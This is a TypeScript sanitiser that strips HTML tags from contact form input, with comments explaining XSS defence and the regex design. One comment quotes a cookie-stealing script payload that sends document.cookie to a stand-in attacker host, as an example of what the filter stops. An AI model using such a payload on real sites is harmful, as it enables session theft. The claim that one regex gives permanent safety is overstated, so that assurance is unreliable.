/**
 * WHAT: Strips all HTML tags from a string. Used on every contact form
 *       field on the server before the data is logged, emailed, or shown
 *       anywhere downstream.
 *
 * WHY:  Defence-in-depth against XSS. Even though the contact form sends
 *       plain-text email (not HTML), we sanitise at the input boundary so
 *       that ANY future code path — admin dashboard, HTML email template,
 *       confirmation page — that re-renders submissions cannot accidentally
 *       become an injection vector. The cost is one regex; the safety is
 *       permanent.
 *
 * IF REMOVED: a malicious submission like `<script>fetch("https://attacker
 *             .com?c=" + document.cookie)</script>` would be stored intact.
 *             The first time anyone displays a submission as HTML, the
 *             script runs in their browser session.
 *
 * COMMON MISTAKE: using a naive regex like /<.*>/g. That would also strip
 *                 legitimate text like "are you open if temp < 0 or > 30?"
 *                 because it matches `< 0 or > ` greedily. The regex below
 *                 requires a letter (or "/") right after `<`, which is the
 *                 actual HTML grammar — distinguishes real tags from math.
 */


/**
 * Matches an HTML tag:
 *   <          opening bracket
 *   \/?        optional closing-tag slash
 *   [a-zA-Z]   tag name MUST start with a letter (this is the key rule
 *              that prevents matching `< 8` or `<3` as fake tags)
 *   [^>]*      everything up to the next `>` — attributes, whitespace, etc.
 *   >          closing bracket
 *
 * `g` flag → replace ALL matches, not just the first.
 *
 * The /i flag is unnecessary because [a-zA-Z] already accepts both cases.
 */
const HTML_TAG = /<\/?[a-zA-Z][^>]*>/g;


/**
 * Returns the input with all HTML tags removed.
 *
 * - `null` and `undefined` → empty string (so callers can pipe form
 *   data through without a null-check first)
 * - empty string → empty string
 * - any other string → tags stripped, everything else preserved verbatim
 *
 * Performance: the regex is O(n) on input length — no catastrophic
 * backtracking is possible because [^>]* is bounded by the next `>` and
 * the engine doesn't backtrack across `>`.
 */
export function sanitize(input: string | null | undefined): string {
  // Treat null and undefined as "no input" rather than throwing.
  // The `==` is intentional — it matches both null and undefined.
  if (input == null) return "";

  return input.replace(HTML_TAG, "");
}
